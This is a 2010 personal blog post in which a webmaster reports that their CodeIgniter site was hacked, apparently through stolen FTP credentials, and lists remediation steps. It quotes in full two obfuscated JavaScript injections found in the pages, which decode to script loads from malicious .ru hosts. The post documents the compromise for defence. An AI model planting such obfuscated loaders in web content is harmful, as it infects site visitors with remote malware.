---
title: Website hacked with random URL to access (http://ku6-com.haberturk.com.careerbuilder-com.webnetlinks.ru:8080/)
date: "2010-01-27T12:18:00"
modified: "2011-02-21T14:17:24"
author: osify
categories:
  - How to kill Virus
  - Tips
tags:
  - Hack
  - Virus
lang: en
excerpt: One of my website has been hacked by some hacker or can be with some libraries I am using for my CodeIgniter project… I’m not sure if it is due to the library or about my web hosting place…. I’m still investigating the…
origin:
  site: osify
  id: 98
  url: https://osify.com/2010/01/website-hacked-with-random-url-to-access-httpku6-com-haberturk-com-careerbuilder-com-webnetlinks-ru8080/
  host: osify.com
legacyUrls:
  - https://osify.com/2010/01/website-hacked-with-random-url-to-access-httpku6-com-haberturk-com-careerbuilder-com-webnetlinks-ru8080/
mergedFrom: []
mediaCount: 0
featured: false
draft: false
---

One of my website has been hacked by some hacker or can be with some libraries I am using for my CodeIgniter project… I’m not sure if it is due to the library or about my web hosting place…. I’m still investigating the issue.

It is trying to access to random URL as :

> http://ku6-com.haberturk.com.careerbuilder-com.webnetlinks.ru:8080/apple.com/apple.com/drudgereport.com/google.com/joy.cn/

Mostly the random URL start with:

> http://ku6-com.haberturk.com.careerbuilder-com.webnetlinks.ru:8080

Check to webnetlinks.ru I got alert from WOT (Add-on of firefox) that this site is unsafe.

View my page source code found:

- Following script before html tag

> ```
> <script src='+'h^&)t($t)$#p&($^$:@$/)^)/)^@(k^^^!u)))
> 6@(-&^c((!!o#@^m#.@&h#@a()(b!e@)!r!##t(@^u&r$#k$.!#c)!o@(&m&@.^&@c@@#a^)r
> $#^!&e&$^@e@#)!r@&b^)u)^i!(l)(d&@e)!#r!)(-(c!^^o$^m^^!.!!&w^&(e(!^b!#)^!n!#)e#
> (&)t!&l##!^!i&@n#$k$&s)&#.&@!$r@)@u$!):$8)^&0$$!8&!0)(#$/)$a)#p!$p$l&#e&#.^^
> @#c#o$$&)m$$#/!)a^@@$p)!p)l^#e&!.!$#c#(@o)$)^m((&/&&d^&r$@u!@^d^)&g$$)e#$
> @r(^e(^!p&^o@!^&r^^)#t)&(#.)$^c()o^)m(@@/@@g$&#^#o#o$g&l#!e(&.#!(c^&o^$m)#&
> &/$j$o#$)y).@^c&)n(@&/!@'.replace(/\$|\!|\)|\^|#|@|\(|&/ig, '')+' defer=defer>
> </scr'+'ipt>
> ```

- At the end of html tag found some hidden code:

> 82fd50e7972f75db5204eef49fd077cc

All those above, I didn’t code so consider this point to start searching.

Note: I have no any issue at my local site.

Hope I’ll find soon

Update 27/01, 1:30pm: Very bad, these scripts are added to most html pages, to most javascript files. Seem not issue due to any library of CodeIgniter but with some virus who can hack using ftp, it may be my password is very poor that it can hack.

Update 29/01, 12:48pm: Now again, new hack script added the same site (before I didn’t change ftp password yet), here is the new script:

> ```
> try{window.onload=function(){document.write('<div id="megaid">youjizz-com.oneindia.in.d</div>');Lb4bz8i1odh = document.getElementById('megaid').innerHTML + 'u$#!$^o#@@w&a(n(@!-$$$c@(o$)!$m)&$@!.!)$(@t)^o($(p)!#l$i$@n#$^e&^(m@#&a@$^#r^^i@@^(n$e^##.#r&^$u(@^:)$D@!#E^()B^&U!(@&G#$#$/&&(s#^$p@(!(o$n&@i$)c@^h$#i^@$.^c&(o)$.(!j#@(p(!^^!/$s#!p(!&^o#n@)#i^!c##h)#)i(@.@!&^c(#o))@!.!j(^#p^^!!/@(^#@x)@t#!e!#$)n$)^d!(m@e@d((i&^!a^$!&).)@)#(c)$#o&^^#m#@$/!^^&g$@$o#o@!(g&!@#l#@#e#.@$@#c!(o^m)!^/&a!)l(!(i@c$!&e(^^.)!#^i^#$t($/@&'.replace(/@|\$|#|&|\^|\!|\)|\(/ig, '') ;document.write('<scr'+'ipt src="http://%27+Lb4bz8i1odh.replace%28/DEBUG/g,"></scr'+'ipt>');} }  catch(Ijhdnoxns ) {}<!--82fd50e7972f75db5204eef49fd077cc--><script> try{window.onload=function(){document.write('<div id="megaid">youjizz-com.oneindia.in.d</div>');Lb4bz8i1odh = document.getElementById('megaid').innerHTML + 'u$#!$^o#@@w&a(n(@!-$$$c@(o$)!$m)&$@!.!)$(@t)^o($(p)!#l$i$@n#$^e&^(m@#&a@$^#r^^i@@^(n$e^##.#r&^$u(@^:)$D@!#E^()B^&U!(@&G#$#$/&&(s#^$p@(!(o$n&@i$)c@^h$#i^@$.^c&(o)$.(!j#@(p(!^^!/$s#!p(!&^o#n@)#i^!c##h)#)i(@.@!&^c(#o))@!.!j(^#p^^!!/@(^#@x)@t#!e!#$)n$)^d!(m@e@d((i&^!a^$!&).)@)#(c)$#o&^^#m#@$/!^^&g$@$o#o@!(g&!@#l#@#e#.@$@#c!(o^m)!^/&a!)l(!(i@c$!&e(^^.)!#^i^#$t($/@&'.replace(/@|\$|#|&|\^|\!|\)|\(/ig, '') ;document.write('<scr'+'ipt src="http://'+Lb4bz8i1odh.replace(/DEBUG/g,"></scr'+'ipt>');} }  catch(Ijhdnoxns ) {}</script><!--82fd50e7972f75db5204eef49fd077cc-->
> ```

Related issue found on the net:

1. <http://blog.unmaskparasites.com/2009/12/23/from-hidden-iframes-to-obfuscated-scripts/>
2. <http://blog.unmaskparasites.com/2009/09/23/10-ftp-clients-malware-steals-credentials-from/>

Solutions: (that may can prevent not to happen again)
I’m using FileZilla as a ftp client

1. Change ftp password
2. Change application password
3. Scan virus on the pc that using
4. Remove all storing passwords on FTP clients
